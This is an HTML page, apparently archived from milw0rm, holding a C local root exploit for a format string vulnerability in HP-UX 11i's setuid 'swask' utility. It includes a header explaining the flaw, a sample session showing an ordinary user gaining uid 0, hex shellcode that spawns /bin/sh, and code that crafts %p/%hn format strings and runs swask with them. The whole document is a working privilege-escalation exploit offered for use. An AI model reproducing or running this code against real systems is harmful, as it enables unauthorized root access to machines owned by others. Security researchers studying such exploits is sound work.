<html><head><title>HP-UX 11i (swask) Format String Local Root Exploit</title></head><pre>/* HP-UX swask format string local root exploit
 * ============================================
 * HP-UX 'swask' contains an exploitable format string 
 * vulnerability. The 'swask' utility is installed setuid
 * root by default. Specifically the vulnerability is in
 * the handling of the &quot;-s&quot; optional arguement which is
 * passed to a format function as verbatim.  
 *
 * Example.
 * $ uname -a
 * HP-UX hpux B.11.11 U 9000/785 2012383315 unlimited-user license
 * $ id
 * uid=102(user) gid=20(users)
 * $ ./prdelka-vs-HPUX-swask
 * [ HP-UX 11i 'swask' local root exploit
 * =======  01/20/06 10:19:49 EST  BEGIN swask SESSION (non-interactive)
 * &lt;SNIP&gt;
 * 
 * =======  01/20/06 10:19:50 EST  END swask SESSION (non-interactive)
 * 
 * $ id
 * uid=0(root) gid=3(sys) euid=102(user) egid=20(users)
 * $
 *
 * - prdelka
 */

char shellcode[]=
		 &quot;\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22&quot;
		 &quot;\x0f\x40\x12\x0e\x20\x20\x08\x01\xe4\x20\xe0\x08&quot;
		 &quot;\xb4\x16\x70\x16&quot;&quot;/bin/sh&quot;;

int main(){
        char *d, *c, *b,*a,*envp;
        int i,pid;
	printf(&quot;[ HP-UX 11i 'swask' local root exploit\n&quot;);
	switch(pid = fork()){
		case -1:
			perror(&quot;fork&quot;);
		case 0:
	        	a=(char*)malloc(2048);
        		memset(a,0,2048); 
        		sprintf(a,&quot;AAAAA%c%c%c%c&quot;,0x7a,0xec,0x44,0x38); 
        		for(i=0;i&lt;103;i++) strcat(a,&quot;%p&quot;);
			envp=0;
			execle(&quot;/usr/sbin/swask&quot;,&quot;swask&quot;,&quot;-s&quot;,a,0,envp);
			break;
		default:
			sleep(1);
			b=(char*)malloc(2048);
        		memset(b,0,2048);
        		for(i=0;i&lt;102;i++) strcat(b,&quot;%p&quot;);
			strcat(b,&quot;%31799u%hn&quot;);
			a=(char*)malloc(2048);
			memset(a,0,2048);
			d=a;
			for(i=0;i&lt;39;i++)strcat(a,&quot;A&quot;);
			d+=39;
			for(i=0;i&lt;strlen(shellcode);i++) *d++=shellcode[i];
			envp=0;
			execle(&quot;/usr/sbin/swask&quot;,&quot;swask&quot;,&quot;-s&quot;,a,&quot;-s&quot;,b,0,envp);
	}
}

// milw0rm.com [2006-10-24]</pre></html>